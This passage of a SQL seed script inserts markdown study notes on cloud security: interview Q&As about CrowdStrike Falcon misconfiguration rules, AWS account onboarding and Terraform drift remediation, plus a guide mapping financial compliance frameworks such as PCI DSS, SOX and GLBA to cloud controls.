> - Test in Alert-Only mode for 2 weeks before enabling enforcement
> - Document every severity override with regulatory justification
> - Disable irrelevant rules with documented reason (e.g., 'We don't use GCP Dataflow')"

---

### Q3. "How do you handle false positives in IOM policies?"

**Answer:**

> "False positive management is critical for maintaining analyst trust in the system. My approach:
>
> **Step 1: Validate** — Before marking as FP, I verify: Is the configuration *actually* secure despite triggering the rule? For example, an S3 bucket flagged as 'public' might have a bucket policy that restricts to a specific CloudFront OAI — technically public ACL, but effectively private.
>
> **Step 2: Scoped Exception** — If it's a true FP, I create a narrow exception:
> - Scope to the specific resource ARN (not the entire account)
> - Add justification: 'This S3 bucket is a public website host with CloudFront OAI restriction'
> - Set 90-day expiry (forces re-validation)
> - Assign a reviewer (security team member)
>
> **Step 3: Rule Tuning** — If the same FP pattern repeats across multiple resources, I modify the rule logic rather than creating individual exceptions. For example, add a condition: 'Exclude buckets tagged Website=true that have CloudFront OAI policy.'
>
> **Step 4: Metrics** — I track FP rate per rule. If a rule has <50% true positive rate, it needs tuning or should be re-scoped. The goal is >80% TP rate for every enabled rule."

---

### Q4. "What are the most critical IOM rules for container security?"

**Answer:**

> "The top 5, ordered by risk:
>
> 1. **Privileged Containers** (CRITICAL) — Full host kernel access. An attacker in a privileged container can escape to the node using nsenter, mount host filesystem, and compromise the entire cluster. Should always be PREVENT mode.
>
> 2. **Docker Socket Mount** (CRITICAL) — Mounting `/var/run/docker.sock` gives the container control of the Docker daemon on the host. Attacker can spawn new privileged containers, read secrets from other containers, or compromise the node. Use Kaniko for in-cluster builds instead.
>
> 3. **Root User** (HIGH) — Containers running as UID 0 have broader access to host resources when combined with other misconfigs. Always enforce `runAsNonRoot: true` and explicit UID in SecurityContext.
>
> 4. **Dangerous Capabilities** (HIGH) — SYS_ADMIN is essentially privileged mode. NET_RAW enables packet sniffing. SYS_PTRACE allows process injection. Best practice: `drop: ALL`, then add only what's needed.
>
> 5. **No NetworkPolicy** (HIGH) — Without NetworkPolicy, all pods communicate freely. One compromised pod = lateral movement to all pods. Deploy default-deny and then whitelist required traffic."

---

### Q5. "How do you roll out IOM enforcement without breaking production?"

**Answer:**

> "I use a phased rollout strategy — never 'big bang':
>
> **Week 1-2: ALERT Mode (Observe)**
> - Deploy all IOM rules and KAC policies in Alert/Detect-Only mode
> - Monitor: How many existing deployments would be blocked?
> - Identify: Which teams have non-compliant workloads?
> - Create a findings spreadsheet: resource, team, violation, remediation
>
> **Week 3: Engage Teams (Fix)**
> - Share findings with each team — provide exact Terraform/YAML fixes
> - Hold security office hours for questions
> - Priority: Critical rules first (privileged, docker socket)
> - Track remediation progress
>
> **Week 4: Enforce Critical Rules**
> - Switch privileged container + docker socket rules to PREVENT
> - These have near-zero FP rate — safe to enforce
> - Monitor for deployment failures
>
> **Week 5-6: Enforce Remaining Rules**
> - Switch root user, capabilities, NetworkPolicy to PREVENT
> - These may need exceptions (system components, monitoring agents)
>
> **Ongoing: Continuous Improvement**
> - New clusters auto-inherit policies
> - Monthly exception review
> - Quarterly rule coverage assessment"

---

## Section B: AWS Onboarding (5 Questions)

---

### Q6. "Walk me through onboarding an AWS account to CrowdStrike Falcon for CSPM."

**Answer:**

> "The process has 4 steps:
>
> **Step 1: API Client** — In Falcon Console → Support & Resources → API Clients, create a new API client with 'Cloud Security Registration: Read+Write' scope. Save the Client ID and Secret immediately — the secret is shown only once.
>
> **Step 2: Account Registration** — Navigate to Cloud Security → Cloud Account Registration → Add AWS Account. Choose features: CSPM, IOA, Identity Protection. Provide the AWS Account ID.
>
> **Step 3: CloudFormation Stack** — Falcon generates a CloudFormation template. Deploy it in the target AWS account. It creates a cross-account IAM role with read-only permissions and an External ID for security (anti-confused deputy). Takes 3-5 minutes.
>
> **Step 4: Verification** — Back in Falcon, verify the account shows as 'Connected.' Wait 15-30 minutes for the first scan. Review initial findings in Configuration Assessment.
>
> **For enterprise/organization-wide:** Use AWS StackSets to deploy the CloudFormation template across all member accounts simultaneously. New accounts auto-enroll.
>
> **For IaC-first organizations:** Use the CrowdStrike Terraform provider (`crowdstrike/crowdstrike`) with the `crowdstrike_cloud_aws_account` resource and the official Terraform module for AWS registration."

---

### Q7. "What permissions does CrowdStrike need in your AWS account, and how do you ensure least privilege?"

**Answer:**

> "CrowdStrike uses a **cross-account IAM role** with specific, read-only permissions:
>
> **Permissions include:**
> - `ec2:Describe*` — Read SG, VPC, subnet, instance configs
> - `s3:GetBucket*`, `s3:GetEncryption*` — Read bucket configs (NOT object data)
> - `iam:Get*`, `iam:List*` — Read IAM policies, roles, users
> - `eks:Describe*`, `eks:List*` — Read EKS cluster configs
> - `rds:Describe*` — Read database configs
> - `lambda:Get*`, `lambda:List*` — Read function configs
> - `cloudtrail:Describe*` — Read trail settings
>
> **Security controls on the role:**
> - **External ID** — Prevents confused deputy attacks. Only CrowdStrike with the matching External ID can assume the role.
> - **Read-Only** — No write permissions. CrowdStrike cannot modify your resources.
> - **Trust Policy** — Limited to CrowdStrike's specific AWS account ARN.
> - **No Data Access** — For S3, it reads bucket policies/encryption, NOT the actual objects.
>
> **Verification:** I always review the CloudFormation template before deploying it. I check the IAM policy statement by statement. If any permission seems excessive, I raise it with CrowdStrike support."

---

### Q8. "What do you do after the first CSPM scan shows 500+ IOMs?"

**Answer:**

> "500+ IOMs on the first scan is completely normal for a brownfield environment. Here's my triaging approach:
>
> **Priority 1: Critical + Internet-Facing (Fix in 4h)**
> - Filter by: Severity = Critical AND NetworkExposure = Internet-Facing
> - These are your active attack surface — public S3, open SGs, public RDS
> - Usually 10-20 findings — manageable in day 1
>
> **Priority 2: Critical + Internal (Fix in 24h)**
> - Critical findings but not internet-facing
> - Still important but lower exploitation risk
>
> **Priority 3: High + Production (Fix in 48h)**
> - High severity in production accounts
>
> **Priority 4: Baseline Everything Else**
> - Medium/Low → Track in dashboard, assign to teams
> - Create weekly remediation targets: 'Reduce Critical from 50 to 30 this week'
>
> **What I report to leadership:** Not '500 findings' — instead: '12 critical attack paths involving internet-facing resources. I've closed the top 5. Here's my plan for the remaining 7 this week.'"

---

### Q9. "How do you onboard an entire AWS Organization versus individual accounts?"

**Answer:**

> "For AWS Organization-wide onboarding:
>
> **Approach:** Use the Organization registration option in Falcon, which leverages AWS CloudFormation StackSets.
>
> **Steps:**
> 1. Register the AWS Management Account (or delegated admin) in Falcon
> 2. Provide the AWS Organization ID
> 3. Falcon generates a StackSet template
> 4. Deploy via StackSets → automatically creates the IAM role in ALL member accounts
> 5. New accounts added later → auto-enrolled via StackSet auto-deployment
>
> **Benefits over individual registration:**
> - One deployment covers 50, 100, or 500 accounts
> - New accounts get Falcon automatically — no security gap
> - Centralized management from management account
> - Consistent IAM permissions across all accounts
>
> **Considerations:**
> - Requires StackSets admin permissions in management account
> - Some organizations use delegated admin for StackSets
> - Region restrictions: Deploy StackSet to all regions or target specific ones
> - Exception accounts: Can exclude specific accounts from the StackSet if needed"

---

### Q10. "Can you onboard AWS using Terraform instead of CloudFormation?"

**Answer:**

> "Yes — CrowdStrike provides an official Terraform provider and module:
>
> ```hcl
> # Provider setup
> provider 'crowdstrike' {
>   client_id     = var.falcon_client_id
>   client_secret = var.falcon_client_secret
>   cloud         = 'us-1'
> }
>
> # Register AWS account
> resource 'crowdstrike_cloud_aws_account' 'prod' {
>   account_id    = '123456789012'
>   cspm_enabled  = true
> }
>
> # Deploy IAM resources using official module
> module 'crowdstrike_cspm' {
>   source  = 'crowdstrike/cloud-registration/aws'
>   version = '~> 1.0'
>   falcon_client_id = var.falcon_client_id
>   external_id      = crowdstrike_cloud_aws_account.prod.external_id
> }
> ```
>
> **Why Terraform is preferred for IaC-first orgs:**
> - Version controlled — registration config in git
> - Reproducible — same module for all accounts
> - Auditable — PR review before deployment
> - Consistent — no console clicks, no manual errors
> - Integrated — same workflow as rest of infrastructure"

---

## Section C: Terraform Drift & Remediation (7 Questions)

---

### Q11. "What is configuration drift, and how do you detect it?"

**Answer:**

> "Configuration drift is when the live cloud resource state diverges from what's defined in your Infrastructure as Code (Terraform). It happens when someone makes manual changes via the AWS Console, CLI, or another automation tool.
>
> **Detection methods I use:**
> 1. **CrowdStrike Falcon CSPM** — Continuously scans live infrastructure and flags misconfigurations. If the IaC is correct but the runtime doesn't match, it's drift.
> 2. **`terraform plan -refresh-only`** — Compares Terraform state with live infrastructure. Shows what changed without planning to revert it.
> 3. **`terraform plan -detailed-exitcode`** — Returns exit code 2 if drift exists. Perfect for CI/CD automation.
> 4. **AWS Config Rules** — Detects specific configuration changes in real-time.
> 5. **CloudTrail monitoring** — Detect manual API calls that modify Terraform-managed resources.
>
> **My drift prevention strategy:**
> - CI/CD pipeline runs `terraform plan` nightly — alerts on any drift
> - All manual console access requires MFA + justification
> - SCPs prevent certain manual changes in production accounts
> - Post-incident review: if drift was from emergency fix, update IaC immediately"

---

### Q12. "How do you remediate a misconfiguration found by Falcon CSPM using Terraform?"

**Answer:**

> "My remediation workflow has 5 steps:
>
> **Step 1: Identify** — Falcon CSPM fires IOM: 'Security Group allows 0.0.0.0/0 to port 22'
>
> **Step 2: Trace to IaC Source**
> - Check resource tags: `terraform:workspace`, `terraform:module`
> - Find the .tf file in the repo: `modules/networking/security_groups.tf`
> - Compare IaC definition vs. live config
> - Is it drift (IaC is correct, live is wrong) or bad IaC (code is wrong)?
>
> **Step 3: Fix in Code**
> ```hcl
> # Before (insecure):
> cidr_blocks = ['0.0.0.0/0']
>
> # After (secure):
> cidr_blocks = ['10.0.0.0/8']    # Corporate CIDR only
> ```
>
> **Step 4: Apply via CI/CD**
> - Create PR with the fix
> - IaC scanner (Checkov) validates the change
> - Peer review + approval
> - `terraform apply` via pipeline (not manually)
>
> **Step 5: Verify**
> - Falcon re-scans → IOM resolved automatically
> - Close the Jira ticket
> - Update the remediation dashboard
>
> **Critical rule:** Never fix drift in the console — fix it in the Terraform code so it stays fixed permanently."

---

### Q13. "What's the difference between terraform plan -refresh-only and terraform apply?"

**Answer:**

> "`terraform plan -refresh-only` is a *read-only* operation that detects drift without planning any changes. It compares the live infrastructure state against Terraform's state file and shows you what changed *outside* of Terraform. It answers: 'Has anyone modified my resources manually?'
>
> `terraform apply` (without refresh-only) will actually modify infrastructure to match your Terraform code. If drift exists, `terraform apply` will revert the manual changes and bring the live state back in line with code.
>
> **When to use each:**
> - **Drift detection mode:** `terraform plan -refresh-only` (daily CI check)
> - **Accept manual changes:** `terraform apply -refresh-only` (updates state file to match live — use when the manual change was intentional)
> - **Revert drift:** `terraform apply` (overwrites manual changes with code definition)
> - **Target specific resources:** `terraform plan -target=aws_security_group.main` (check drift on one resource)"

---

### Q14. "How do you prevent misconfigurations from reaching production in the first place?"

**Answer:**

> "I implement a 4-gate security pipeline:
>
> **Gate 1: Pre-Commit (Developer's Machine)**
> - Pre-commit hooks running tfsec, detect-secrets
> - Catches obvious issues before code is even committed
>
> **Gate 2: CI Pipeline (IaC Scan)**
> - Checkov / tfsec / Falcon IaC Scan runs on every PR
> - Fail the build on Critical/High findings
> - Developer sees exact finding + remediation in PR comments
>
> **Gate 3: Terraform Plan Review**
> - terraform plan output posted as PR comment
> - Security team reviews for sensitive changes (IAM, SG, encryption)
> - No auto-apply to production without approval
>
> **Gate 4: Runtime (KAC / CSPM)**
> - CrowdStrike KAC blocks non-compliant K8s deployments
> - CSPM catches anything that slipped through
> - Auto-remediation for simple fixes (public S3 → re-enable block public access)
>
> **Result:** Misconfigurations are caught at the cheapest point to fix (code review) rather than the most expensive point (production incident)."

---

### Q15. "Scenario: A developer manually opens port 22 via AWS Console during an incident. How do you handle this?"

**Answer:**

> "**Immediate (During Incident):** Allow it — don't block emergency access. Safety first.
>
> **Post-Incident (Within 4 hours):**
> 1. CloudTrail shows: `AuthorizeSecurityGroupIngress` by `user/jane.doe` at 2:30 AM
> 2. Falcon CSPM fires: IOM 'SG allows 0.0.0.0/0 to port 22' — Severity CRITICAL
> 3. I contact Jane: 'Was this for last night's incident? Is SSH still needed?'
> 4. If no longer needed: Revert via Terraform (not console — to prevent permanent drift)
>
> **Permanent Fix:**
> 5. Update Terraform: Remove the SSH rule or restrict to VPN CIDR
> 6. Propose SSM Session Manager as the standard access method
> 7. Add SCP to prevent `0.0.0.0/0` SSH rules in production via AWS Organizations
>
> **Process Improvement:**
> 8. Create an emergency access runbook: 'During incident, use SSM instead of opening ports'
> 9. If SSH is truly needed for emergencies, create a time-limited Terraform module that opens SSH for 2 hours then auto-reverts
>
> **Key principle:** Understand *why* they did it, fix the root cause (lack of SSM), and prevent recurrence through both technical controls (SCP) and process (runbook)."

---

### Q16. "How do you handle situations where Terraform state and reality are completely out of sync?"

**Answer:**

> "This typically happens when infrastructure was partially built manually or when someone modified resources outside Terraform extensively. My recovery process:
>
> **Step 1: Assess the gap**
> - Run `terraform plan` to see the full extent of drift
> - Categorize: How many resources are affected?
>
> **Step 2: Decide the approach**
> - **Minor drift (1-5 resources):** `terraform import` the unmanaged resources, write matching .tf code, then run `terraform plan` to verify zero changes
> - **Major drift (many resources):** Consider using `terraform state rm` for resources that should no longer be managed, and `terraform import` for new ones
> - **Complete desync:** Sometimes it's better to re-import all resources into a new workspace than to fix the existing state
>
> **Step 3: Reconcile**
> - For each imported resource, write Terraform code that exactly matches the current live config
> - Run `terraform plan` — output should show zero changes
> - Then create follow-up PRs to bring the config to the desired secure state
>
> **Prevention:** 
> - Nightly `terraform plan` CI job that alerts on any drift
> - Read-only console access for developers (can view, not modify)
> - SCPs to prevent manual modifications to Terraform-tagged resources"

---

### Q17. "How do you integrate CrowdStrike Falcon CSPM findings with your Terraform workflow?"

**Answer:**

> "I build a closed-loop feedback system:
>
> **Falcon → Ticket → Code → Deploy → Falcon (Verify)**
>
> 1. **Falcon CSPM detects IOM** → Sends webhook to Jira
> 2. **Jira ticket auto-created** → Contains:
>    - IOM details, severity, affected resource ARN
>    - Exact Terraform remediation code snippet
>    - SLA deadline based on severity
>    - Assigned to team based on resource tags
> 3. **Developer creates PR** → Fixes the Terraform code
> 4. **CI pipeline runs** → Checkov validates the fix
> 5. **terraform apply** → Deploys the remediation
> 6. **Falcon re-scans** → IOM disappears → Ticket auto-closed
>
> **For IaC scanning (proactive):**
> - Falcon IaC scanner or Checkov runs in the CI pipeline
> - Scans Terraform files *before* deployment
> - Blocks PRs that would create new IOMs
>
> **Result:** 
> - IOMs found in production → fixed in code → never recur
> - New misconfigurations → caught in PR → never reach production
> - Continuous improvement loop: fewer IOMs over time"

---

## Section D: Advanced & Scenario Questions (5 Questions)

---

### Q18. "How do you prioritize IOM remediation across 50 AWS accounts with thousands of findings?"

**Answer:**

> "I use a risk-based prioritization matrix, not alphabetical ordering:
>
> **Tier 1: Fix NOW (Critical + Internet-Facing + Production)**
> - Filter: severity=CRITICAL AND exposure=internet AND env=production
> - Examples: Public S3 in prod, open SSH in prod
> - SLA: 4 hours
> - Usually 10-30 findings — manageable
>
> **Tier 2: Fix This Week (Critical + Internal + Production)**
> - Not internet-facing but still critical config issues
> - SLA: 24-48 hours
>
> **Tier 3: Fix This Sprint (High + Production)**
> - High severity in production
> - SLA: 7 days
> - Assign to individual teams
>
> **Tier 4: Track and Plan (Medium + Any, Low + Any)**
> - Track in dashboard, assign quarterly remediation goals
> - If a team has 50 medium findings, help them fix 10 per sprint
>
> **CEO Dashboard:** I report trends, not abs numbers: 'Critical findings reduced 60% over 3 months. 4 critical attack paths remain, targeting them this sprint.'"

---

### Q19. "How would you automate the remediation of common IOMs using Terraform?"

**Answer:**

> "I automate high-frequency, low-complexity IOMs where the fix is deterministic:
>
> **Automation 1: Auto-fix Public S3 Buckets**
> - Trigger: Falcon CSPM IOM 'S3 bucket publicly accessible'
> - Action: EventBridge → Lambda → Calls S3 API to enable Block Public Access
> - Terraform module: Pre-built that includes all S3 security settings
>
> **Automation 2: Auto-fix Open Security Groups**
> - Trigger: Falcon IOM 'SG allows 0.0.0.0/0 on port 22'
> - Action: Lambda revokes the rule + creates Jira ticket for review
> - Terraform: SCP prevents creation of 0.0.0.0/0 rules in production
>
> **Automation 3: Terraform Modules as Prevention**
> - Create organization-standard Terraform modules for common resources
> - S3 module automatically includes: encryption, versioning, logging, block-public-access
> - Developers use the module instead of raw resources → security built in
>
> **What I DON'T automate:**
> - IAM policy changes (too complex, could break applications)
> - Encryption key changes (could cause data loss)
> - Network routing changes (could cause outages)
> - These need human review and approval"

---

### Q20. "Explain the CrowdStrike Terraform provider and how it integrates with cloud security."

**Answer:**

> "The CrowdStrike Terraform provider (`crowdstrike/crowdstrike` on the Terraform Registry) allows you to manage Falcon configurations as Infrastructure as Code:
>
> **Resources available:**
> - `crowdstrike_cloud_aws_account` — Register/manage AWS accounts for CSPM
> - `crowdstrike_cloud_security_kac_policy` — Define KAC admission policies
> - `crowdstrike_prevention_policy` — Configure host prevention policies
> - `crowdstrike_sensor_update_policy` — Manage sensor update settings
>
> **Benefits:**
> - Security policies stored in git alongside infrastructure code
> - Changes to security configs go through PR review
> - Consistent deployment across environments (dev/staging/prod)
> - Rollback capability via `terraform destroy` or state revert
> - Audit trail in git history
>
> **Example workflow:**
> 1. Security engineer writes KAC policy in Terraform
> 2. PR review by security lead
> 3. Apply to staging cluster first (test mode)
> 4. After 1 week of monitoring, promote to production
> 5. Any issues → `git revert` → `terraform apply` → instant rollback
>
> **Key integration point:** Combining `crowdstrike` provider with `kubernetes` and `aws` providers in the same Terraform workspace lets you deploy infrastructure + security policies in a single pipeline."

---

### Q21. "What compliance frameworks can you map IOM policies to in CrowdStrike Falcon?"

**Answer:**

> "CrowdStrike Falcon supports multiple built-in compliance framework mappings:
>
> **Built-in Frameworks:**
> - CIS AWS Foundations Benchmark (v1.4, v2.0, v3.0)
> - CIS Azure Benchmark
> - CIS GCP Benchmark
> - CIS Kubernetes Benchmark (v1.6, v1.7, v1.8)
> - CIS EKS Benchmark (v1.3, v1.4)
> - CIS Docker Benchmark
> - NIST 800-53
> - PCI-DSS v3.2.1, v4.0
> - SOC 2 (TSC)
> - HIPAA
> - GDPR (data protection articles)
> - ISO 27001
>
> **Custom Framework Mapping:**
> - You can map custom IOM rules to internal compliance standards
> - Example: Map your 'mandatory tagging' rule to 'Internal Policy: Cloud Governance v2.3'
> - This lets you track custom compliance alongside regulatory frameworks
>
> **Reporting:**
> - Falcon generates compliance dashboards per framework
> - One-click export for auditors
> - Trend tracking: 'PCI compliance improved from 72% to 91% over 6 months'
> - Control-level detail: which specific controls pass/fail"

---

### Q22. "What happens when a Falcon KAC policy blocks a legitimate deployment?"

**Answer:**

> "This is a common operational scenario. My response:
>
> **Immediate:** The developer sees a clear error from kubectl:
> ```
> Error from server: admission webhook 'kac.crowdstrike.com' denied the request:
> privileged containers are not allowed [Policy: Block-Privileged]
> ```
>
> **Resolution workflow:**
> 1. Developer contacts security channel (Slack) with the error
> 2. I review: Is this a legitimate need or a misconfigured deployment?
> 3. **If misconfigured:** Help the developer fix the SecurityContext (provide exact YAML)
> 4. **If legitimate exception needed:**
>    - Confirm the business justification (e.g., CNI plugin truly needs privileged)
>    - Create a scoped exception in the KAC policy (namespace + image only)
>    - Document: who approved, why, expiry date (90 days max)
>    - Track in exception registry
> 5. Developer retries deployment → succeeds
>
> **Prevention:** 
> - In Alert mode first (2 weeks) to catch these before switching to Prevent
> - Clear error messages with remediation guidance
> - Security office hours for teams to get help proactively"

---

## Section E: Quick-Fire Interview Questions (5 Questions)

---

### Q23. "Name 3 critical IOM checks for AWS S3."

> 1. **S3 bucket Block Public Access disabled** (CRITICAL — CIS 2.1.5)
> 2. **S3 bucket without server-side encryption** (HIGH — CIS 2.1.1)
> 3. **S3 bucket access logging not enabled** (MEDIUM — CIS 2.1.3)

---

### Q24. "What's the External ID in AWS cross-account role, and why does Falcon use it?"

> "The External ID is a shared secret between CrowdStrike and your account. It's set in the IAM role trust policy's `Condition` block. It prevents the **confused deputy problem** — without it, any CrowdStrike customer could potentially reference your role ARN. With the External ID (unique per registration), only CrowdStrike with YOUR specific External ID can assume YOUR role."

---

### Q25. "What command detects drift without modifying anything?"

> "`terraform plan -refresh-only` — Shows what changed in live infrastructure without planning any modifications. Add `-detailed-exitcode` for CI automation: exit code 2 = drift detected."

---

### Q26. "How does CrowdStrike KAC differ from OPA Gatekeeper?"

> "Both are Kubernetes admission controllers, but:
> - **KAC** is integrated with the CrowdStrike Falcon ecosystem — IOMs, IOAs, image scanning, and threat intelligence all in one console
> - **OPA Gatekeeper** is open-source, uses Rego language for policy-as-code, more flexible but requires more maintenance
> - **KAC advantage:** Can check if an image has been scanned by Falcon before allowing deployment — impossible with standalone OPA
> - **OPA advantage:** More customizable, community-supported policies, no vendor lock-in
> - **In practice:** Many orgs use BOTH — OPA for custom policies, KAC for CrowdStrike-specific checks"

---

### Q27. "What is the difference between IaC scanning and CSPM?"

> "- **IaC scanning** = **Pre-deployment** — Scans Terraform/CloudFormation code in the CI/CD pipeline *before* deployment. Prevents misconfigurations from being created.
> - **CSPM** = **Post-deployment** — Scans live cloud infrastructure *after* deployment. Detects runtime misconfigs, manual changes, and drift.
> - **Together:** IaC scanning catches issues at code review (cheapest). CSPM catches issues that slip through or are created manually (safety net). You need both for complete coverage."

---

# 📋 STUDY CHEATSHEET — KEY CONCEPTS TO MEMORIZE

```
IOM vs IOA:
  IOM = Static config check (S3 public, SG open, pod privileged)
  IOA = Runtime behavior (reverse shell, drift, crypto mining)

AWS ONBOARDING FLOW:
  Create API Client → Register in Falcon → Deploy CloudFormation → Verify

DRIFT DETECTION:
  terraform plan -refresh-only      ← Detect drift
  terraform apply -refresh-only     ← Accept drift into state
  terraform apply                   ← Revert drift to match code

4-GATE PIPELINE:
  Pre-Commit → CI IaC Scan → Plan Review → KAC/CSPM

5 CONTAINER IOMs:
  1. Privileged Container (CRITICAL)
  2. Root User (HIGH)
  3. Docker Socket Mount (CRITICAL)
  4. Dangerous Capabilities (HIGH)
  5. No NetworkPolicy (HIGH)

SEVERITY SLA:
  Critical: 4h | High: 24h | Medium: 7d | Low: 30d

COMPLIANCE FRAMEWORKS:
  CIS AWS, CIS K8s, CIS EKS, PCI-DSS, SOC2, NIST, HIPAA
```

---

> **Guide Created:** April 2026
> **Topics Covered:** IOM Policy Writing, AWS Onboarding, Terraform Drift Remediation, 
> 5 Container Security IOM Rules, 27 Interview Q&As
> **Cross-References:** [CNAPP Policy Examples](./CNAPP_Policy_Examples.md) | [KAC & Runtime Guide](./KAC_and_Runtime_Detections_Guide.md)$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$Financial_Compliance_Frameworks$VELSEC$, $VELSEC$Financial Compliance Frameworks$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['Cloud_Security']::TEXT[], $VELSEC$# 🏦 FINANCIAL COMPLIANCE FRAMEWORKS — Cloud Security Guide

> **Target:** Financial Institutions (Wells Fargo, HSBC, Banking, Fintech)
> **Goal:** Understand the mandatory security frameworks a Cloud Security Analyst must enforce using CNAPP/CSPM tools.

---

## 1. THE "BIG FOUR" MANDATORY FINANCIAL FRAMEWORKS

### 1.1 PCI DSS (Payment Card Industry Data Security Standard)
**What it is:** Global baseline for any organization handling credit card data.
**Key Focus for Cloud:** Network isolation and encryption.
**How it maps to CNAPP/CSPM:**
*   **Req 1 (Network Security):** Ensure strict Security Groups / NSGs. No 0.0.0.0/0 to databases.
*   **Req 3 (Stored Data Protection):** KMS/CMEK encryption enforced on all S3, EBS, and RDS instances.
*   **Req 4 (Data in Transit):** Enforce TLS 1.2+ on all Load Balancers and API Gateways.
*   **Req 10 (Logging):** Ensure CloudTrail, VPC Flow Logs, and DB Audit logging are active and cannot be tampered with.

*Interview Buzzword:* "Cardholder Data Environment (CDE) Isolation." If a pod processes payments, it must be network-isolated from general pods.

### 1.2 GLBA (Gramm-Leach-Bliley Act)
**What it is:** US law requiring financial institutions to explain their information-sharing practices and safeguard sensitive data (NPI - Nonpublic Personal Information).
**Key Focus for Cloud:** Data Privacy and Access Control.
**How it maps to CNAPP/CSPM:**
*   **Access Control:** Strict CIEM enforcement. Least privilege IAM roles.
*   **Data Protection:** Macie / DSPM scanning to identify where NPI (like SSNs, account numbers) lives in S3 buckets.
*   **Risk Assessment:** Continuous CSPM scanning satisfies the GLBA requirement for continuous risk assessment.

### 1.3 SOX (Sarbanes-Oxley Act)
**What it is:** US law focusing on corporate financial reporting accuracy to prevent corporate fraud.
**Key Focus for Cloud:** Change Management and Integrity of Financial Systems.
**How it maps to CNAPP/CSPM:**
*   **Change Control:** Only CI/CD pipelines can deploy to production. KAC (Admission Controllers) enforce immutability (containers cannot be modified at runtime).
*   **Audit Trails:** Immutaiblity of logs. CloudTrail logs must be sent to a central, locked-down S3 bucket (with Object Lock / WORM enabled).
*   **Separation of Duties (SoD):** CIEM checks to ensure a developer cannot both write code and approve their own merge/deploy.

### 1.4 NIST 800-53 / NIST CSF (Cybersecurity Framework)
**What it is:** Not exclusively financial, but it is the *De Facto Gold Standard* baseline that US banks (like Wells Fargo) build their internal security policies upon.
**Key Focus for Cloud:** Comprehensive Security Controls.
**How it maps to CNAPP/CSPM:** *(See Ultimate Prep Guide Part 2 for full mapping)*
*   Banks take NIST 800-53, customize it, and call it their "Internal Control Standard."
*   **CSPM Translation:** Every IOM (Indicator of Misconfiguration) maps to a NIST control Family (e.g., AC for Access Control, SC for System & Comms).

---

## 2. REGIONAL & SPECIALIZED REGULATORY FRAMEWORKS

### 2.1 NYDFS 23 NYCRR 500 (New York Department of Financial Services)
**What it is:** One of the strictest state-level cyber regulations for banks operating in NY (which is basically all major banks).
**Key Focus for Cloud:** 72-hour breach reporting, mandatory MFA, and CISO accountability.
**How it maps to CNAPP/CSPM:**
*   **MFA Enforcement:** CSPM policies must immediately alert if any IAM user or root account lacks MFA.
*   **Incident Response:** CWPP (Runtime protection) speeds up identification to meet the brutal 72-hour regulatory notification window.

### 2.2 FFIEC (Federal Financial Institutions Examination Council)
**What it is:** US regulatory body that audits banks (Examiners use the FFIEC IT Examination Handbook).
**Key Focus for Cloud:** IT Governance, BCDR (Business Continuity/Disaster Recovery), and Third-Party Risk.
**How it maps to CNAPP/CSPM:**
*   **Architecture:** Cross-region backups. CSPM checks that RDS instances are Multi-AZ and DynamoDB has Point-In-Time Recovery (PITR) enabled.

### 2.3 DORA (Digital Operational Resilience Act) - *Crucial for EU / Global Banks*
**What it is:** EU regulation focusing on IT system resilience in the financial sector. 
**Key Focus for Cloud:** Third-party cloud provider risk (AWS/Azure going down) and massive resilience.
**How it maps to CNAPP/CSPM:**
*   Requires strict incident reporting and advanced threat-led penetration testing (TLPT).
*   CWPP provides the forensic data required by DORA during severe operational disruptions.

---

## 3. HOW TO TALK ABOUT COMPLIANCE IN A BANKING INTERVIEW

### 🟢 The "Continuous Compliance" Pitch
> "In a financial organization, compliance isn't an annual checklist; it's a continuous operational state. I use the CNAPP tool to map our cloud estate against PCI-DSS and NIST 800-53 in real-time. Instead of auditor scrambles every December, I configure the CSPM to generate daily compliance posture scores. If a developer launches a database without KMS encryption, we don't wait for an audit—the CSPM flags the PCI violation immediately, creates a ServiceNow ticket, and auto-remediates it via a Python Lambda script if it breaches our 4-hour SLA."

### 🟢 The "Data Governance" Pitch
> "Banks care about NPI (Nonpublic Personal Information) under GLBA. I leverage DSPM (Data Security Posture Management) to automatically classify data in S3 buckets. If a bucket is tagged 'Contains NPI', my CSPM policies dynamically apply stricter guardrails: absolute denial of public access, mandatory strict IAM resource policies, and alerts for any unusual data egress patterns picked up by the CWPP."

### 🟢 The "Audit Readiness" Pitch
> "I act as the bridge between Cloud Engineering and IT Audit. When internal audit asks for evidence under SOX ITGCs (IT General Controls), I don't give them raw logs. I pull the specific Falcon/Wiz compliance report that maps our AWS configurations directly to their control requirements, proving that our separation of duties and encryption-at-rest mandates are actively enforced across 100% of the estate."

---

## 📋 QUICK REFERENCE: Mapping Cloud Services to Banking Compliance

| Cloud Action/Setup | Triggers Which Framework? | How Bank Security Handles It |
| :--- | :--- | :--- |
| Processing credit cards on EKS | **PCI-DSS** | Network isolation, KAC image enforcement, strict WAF. |
| Storing customer SSNs in S3 | **GLBA, NYDFS** | CMEK KMS encryption, Macie classification, highly restricted IAM. |
| Financial reporting database (RDS) | **SOX** | Absolute immutability of logs, rigorous change management, Point-in-time recovery. |
| High availability of trading platform | **FFIEC, DORA** | Multi-AZ/Multi-Region active-active setups, CSPM checks for backup configs. |$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$INDEX$VELSEC$, $VELSEC$Index$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['Cloud_Security']::TEXT[], $VELSEC$﻿# Cloud Security

Index of files in this directory:

- [AWS_Cloud_Security_Checklist.md](./AWS_Cloud_Security_Checklist.md)
- [AWS_Security.pdf](./AWS_Security.pdf)
- [Cloud_Security_Automation_Scripts.md](./Cloud_Security_Automation_Scripts.md)
- [Cloud_Security_Frameworks_DevSecOps_SCA_SAST_DAST_Guide.md](./Cloud_Security_Frameworks_DevSecOps_SCA_SAST_DAST_Guide.md)
- [Cloud_Security_Guides_merged.pdf](./Cloud_Security_Guides_merged.pdf)
- [cloud_security_interview_guide.md](./cloud_security_interview_guide.md)
